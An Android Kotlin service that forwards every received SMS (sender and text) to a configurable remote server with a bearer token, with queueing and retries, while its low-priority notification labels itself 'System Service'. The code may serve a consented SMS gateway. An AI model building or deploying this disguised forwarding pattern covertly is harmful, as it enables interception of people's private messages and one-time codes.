package com.sms.bridge.service

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.ServiceInfo
import android.os.Build
import android.os.IBinder
import android.util.Log
import androidx.core.app.NotificationCompat
import com.sms.bridge.data.AppDatabase
import com.sms.bridge.data.SharedPreferencesHelper
import com.sms.bridge.data.SmsQueueItem
import com.sms.bridge.network.ApiClient
import com.sms.bridge.network.SmsRequest
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.launch

class SmsSyncService : Service() {

    private val serviceJob = SupervisorJob()
    private val serviceScope = CoroutineScope(Dispatchers.IO + serviceJob)

    private lateinit var db: AppDatabase
    private lateinit var prefs: SharedPreferencesHelper

    private var isRetryRunning = false
    private var lastRetryAtMs = 0L

    companion object {
        const val CHANNEL_ID = "SYSTEM_SYNC_CHANNEL_V1"
        const val NOTIF_CHANNEL_ID = "SMS_NOTIF_CHANNEL"
        const val NOTIFICATION_ID = 101

        const val ACTION_START_SERVICE = "START_CORE_SERVICE"
        const val ACTION_STOP_SERVICE = "STOP_CORE_SERVICE"
        const val ACTION_FORWARD_SMS = "FORWARD_SMS_ACTION"
        const val ACTION_RETRY_QUEUE = "RETRY_QUEUE_ACTION"

        const val EXTRA_SENDER = "extra_sender"
        const val EXTRA_MESSAGE = "extra_message"
        const val EXTRA_RECEIVED_AT = "extra_received_at"
        private const val MIN_RETRY_INTERVAL_MS = 15_000L
    }

    override fun onCreate() {
        super.onCreate()
        db = AppDatabase.getDatabase(this)
        prefs = SharedPreferencesHelper(this)
        createNotificationChannel()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        when (intent?.action) {
            ACTION_START_SERVICE -> {
                startForegroundIfNeeded()
            }
            ACTION_STOP_SERVICE -> {
                stopForeground(STOP_FOREGROUND_REMOVE)
                stopSelf()
            }
            ACTION_FORWARD_SMS -> {
                startForegroundIfNeeded()
                val sender = intent.getStringExtra(EXTRA_SENDER) ?: ""
                val message = intent.getStringExtra(EXTRA_MESSAGE) ?: ""
                val receivedAt = intent.getStringExtra(EXTRA_RECEIVED_AT) ?: ""
                if (sender.isNotEmpty() && message.isNotEmpty()) {
                    forwardSms(sender, message, receivedAt)
                }
            }
            ACTION_RETRY_QUEUE -> {
                startForegroundIfNeeded()
                retryPendingQueue(force = true)
            }
        }
        return START_STICKY
    }

    private fun startForegroundIfNeeded() {
        val notification = createNotification("Layanan Sistem", "Aktif")
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            try {
                startForeground(
                    NOTIFICATION_ID,
                    notification,
                    ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
                )
            } catch (e: Exception) {
                Log.e("SmsSyncService", "Failed starting foreground service with type DATA_SYNC: ${e.message}. Trying generic mode.")
                try {
                    startForeground(NOTIFICATION_ID, notification)
                } catch (e2: Exception) {
                    Log.e("SmsSyncService", "Failed fallback startForeground entirely: ${e2.message}")
                }
            }
        } else {
            try {
                startForeground(NOTIFICATION_ID, notification)
            } catch (e: Exception) {
                Log.e("SmsSyncService", "Failed startForeground entirely: ${e.message}")
            }
        }
    }

    private fun createNotification(title: String, text: String): Notification {
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle(title)
            .setContentText(text)
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setOngoing(true)
            .build()
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "Layanan Sistem",
                NotificationManager.IMPORTANCE_MIN
            ).apply {
                description = "Keos background system services working."
            }
            val manager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            manager.createNotificationChannel(channel)
        }
    }


    private suspend fun handleDeviceAccessRevoked() {
        try {
            db.smsDao().clearQueue()
        } catch (_: Exception) {
        }
        prefs.clear()
        stopForeground(STOP_FOREGROUND_REMOVE)
        stopSelf()
    }

    private fun forwardSms(sender: String, message: String, receivedAt: String) {
        serviceScope.launch {
            if (!prefs.isPaired) {
                db.smsDao().insertSms(
                    SmsQueueItem(
                        sender = sender,
                        message = message,
                        receivedAt = receivedAt
                    )
                )
                return@launch
            }

            val token = prefs.deviceToken ?: ""
            val baseUrl = prefs.baseUrl
            val api = ApiClient.getApiService(baseUrl)

            try {
                val response = api.sendSms(
                    authHeader = "Bearer $token",
                    request = SmsRequest(sender, message, receivedAt)
                )

                if (response.isSuccessful) {
                    prefs.lastSync = System.currentTimeMillis()
                    retryPendingQueue(force = false)
                } else {
                    if (response.code() == 401 || response.code() == 403) {
                        handleDeviceAccessRevoked()
                        return@launch
                    }
                    db.smsDao().insertSms(
                        SmsQueueItem(
                            sender = sender,
                            message = message,
                            receivedAt = receivedAt
                        )
                    )
                }
            } catch (e: Exception) {
                db.smsDao().insertSms(
                    SmsQueueItem(
                        sender = sender,
                        message = message,
                        receivedAt = receivedAt
                    )
                )
            }
        }
    }

    private fun retryPendingQueue(force: Boolean = true) {
        val now = System.currentTimeMillis()
        if (!force && now - lastRetryAtMs < MIN_RETRY_INTERVAL_MS) return
        if (isRetryRunning) return

        serviceScope.launch {
            if (!prefs.isPaired) return@launch
            isRetryRunning = true
            lastRetryAtMs = now

            try {
                val pendingSms = db.smsDao().getPendingSmsList()
                if (pendingSms.isEmpty()) return@launch

                val token = prefs.deviceToken ?: ""
                val baseUrl = prefs.baseUrl
                val api = ApiClient.getApiService(baseUrl)

                var hasFailures = false

                for (sms in pendingSms) {
                    if (hasFailures) break
                    try {
                        val response = api.sendSms(
                            authHeader = "Bearer $token",
                            request = SmsRequest(sms.sender, sms.message, sms.receivedAt)
                        )
                        if (response.isSuccessful) {
                            db.smsDao().deleteSms(sms)
                            prefs.lastSync = System.currentTimeMillis()
                        } else {
                            if (response.code() == 401 || response.code() == 403) {
                                handleDeviceAccessRevoked()
                                return@launch
                            }
                            hasFailures = true
                        }
                    } catch (e: Exception) {
                        hasFailures = true
                    }
                }
            } finally {
                isRetryRunning = false
            }
        }
    }

    override fun onDestroy() {
        serviceJob.cancel()
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? = null
}
